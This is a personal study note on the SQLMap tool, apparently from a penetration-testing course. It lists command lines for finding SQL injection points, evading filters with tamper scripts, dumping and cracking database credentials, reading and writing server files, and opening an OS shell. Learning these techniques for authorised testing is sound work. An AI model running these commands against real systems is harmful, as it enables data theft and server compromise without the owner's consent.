# SQLMap Essentials

> Status: ✅ Complete
> Date started: 2026-10-26
> Date finished: 2026-10-26

## 1. Goal
Automate SQL injection: detection, exploitation, DB enumeration, and (where privileges allow) file read/write and OS command execution. SQLMap tries many techniques (boolean/error/UNION/stacked/time-based blind) and payloads for you — but you still have to point it at the right parameter and tune `--level`/`--risk` and tampers to get past filters.

## Targeting the request
```bash
sqlmap -u "http://t/vuln.php?id=1" --batch        # GET param; --batch = accept all defaults, no prompts
sqlmap "http://t/" --data 'uid=1&name=test'       # POST body
sqlmap "http://t/" --data 'uid=1*&name=test'      # * = force the injection point here
sqlmap -r req.txt                                 # feed a saved Burp request (easiest, carries headers/cookies)
sqlmap -u "http://t/?id=1" --cookie='PHPSESSID=...'   # inject/auth via cookie
sqlmap -u t --data='id=1' --method PUT            # other HTTP methods
sqlmap -u "http://t/?id=1" -p id                  # test ONLY this parameter
```
`-r req.txt` is the go-to: capture the request in Burp, save it, point SQLMap at the file so cookies, CSRF tokens and JSON bodies all come along. Mark the point with `*` inside the file. Quick alternative: browser DevTools → Network → **Copy as cURL**, paste into the terminal, and change `curl` to `sqlmap` — all headers/cookies carry over.

SQLMap detects & exploits every SQLi type (**BEUSTQ**): **B**oolean-blind, **E**rror-based, **U**NION, **S**tacked, **T**ime-blind, in**Q**line — plus out-of-band via DNS exfiltration. It has the widest DBMS support of any SQLi tool (MySQL, MSSQL, Oracle, PostgreSQL, SQLite, DB2, MariaDB, and dozens more). The manual meaning of each type is in **module 17**. Install: `apt install sqlmap`, or `git clone` the repo and run `python sqlmap.py`.

## Detection & tuning
```bash
sqlmap ... --level=5 --risk=3                      # widen tests (level=more places, risk=heavier payloads)
sqlmap ... --dbms MySQL                            # skip fingerprinting if you know the DB
sqlmap ... --prefix="%'))" --suffix="-- -"         # non-standard query boundaries (e.g. `) or backtick)
sqlmap ... --union-cols=5 --no-cast                # help UNION when column count/casting trips it up
sqlmap ... --flush-session                         # forget prior results and re-test cleanly
sqlmap ... -v 3                                    # verbosity (see the actual payloads; -v 6 = full traffic)
```
`--flush-session` is the reset button when a run cached a wrong conclusion. `--no-cast` often rescues column retrieval on UNION/error techniques.

## Enumeration (escalating detail)
```bash
sqlmap ... --banner --current-user --current-db --is-dba   # quick lay of the land
sqlmap ... --dbs                                   # list databases
sqlmap ... -D testdb --tables                      # tables in a DB
sqlmap ... -D testdb -T users --columns            # columns in a table
sqlmap ... -D testdb -T users -C name,password --dump   # dump specific columns
sqlmap ... -D testdb -T users --dump --where="name LIKE 'f%'"   # conditional dump
sqlmap ... --schema                                # whole schema at once
sqlmap ... --search -C style                       # find columns by name
sqlmap ... --search -T user                        # find tables by name
sqlmap ... --passwords --batch                     # dump + auto-crack DB user hashes
```

## Bypassing protections
```bash
sqlmap ... --csrf-token="csrf-token"               # auto-refresh an anti-CSRF token (name = the field)
sqlmap ... --randomize="uid"                        # re-randomise a one-time/nonce param each request
sqlmap ... --random-agent                           # rotate User-Agent (beats naive UA blocks)
sqlmap --list-tampers                               # see all tamper scripts
sqlmap ... --tamper=between                          # classic bypass: > becomes NOT BETWEEN 0 AND #, = becomes BETWEEN # AND #
```
`--tamper=between` defeats a lot of primitive `< > =` filters (often meant for XSS, not SQLi). Chain tampers with commas. `--random-agent` + a tamper + `-r req.txt` is a solid default against "basic protection" labs.

## OS exploitation (needs DBA + right conditions)
```bash
sqlmap ... --is-dba                                 # must be true for most of the below
sqlmap ... --file-read="/var/www/html/flag.txt"     # read a file off the DB server
sqlmap ... --file-write="local.ext" --file-dest="/var/www/html/x.ext"   # write a file to the server
sqlmap ... --os-shell                               # interactive OS command shell (where supported)
```
Read output lands under `~/.local/share/sqlmap/output/<target>/files/`. `--file-write` + `--os-shell` are how a DBA-level SQLi turns into RCE — the webshell/payload itself isn't stored in this repo; the flags and the DBA precondition are the point.

> **Workflow:** capture the request in Burp → `sqlmap -r req.txt -p <param> --batch` → if nothing, crank `--level`/`--risk` and add `--dbms`; if a filter blocks you, `--list-tampers` and try `between`/`--random-agent` → enumerate `--dbs` → `-D … --tables` → `-D … -T … --dump` → if `--is-dba` and conditions allow, `--file-read`/`--os-shell`. `--flush-session` + `--no-cast` fix most "it half-worked" situations.
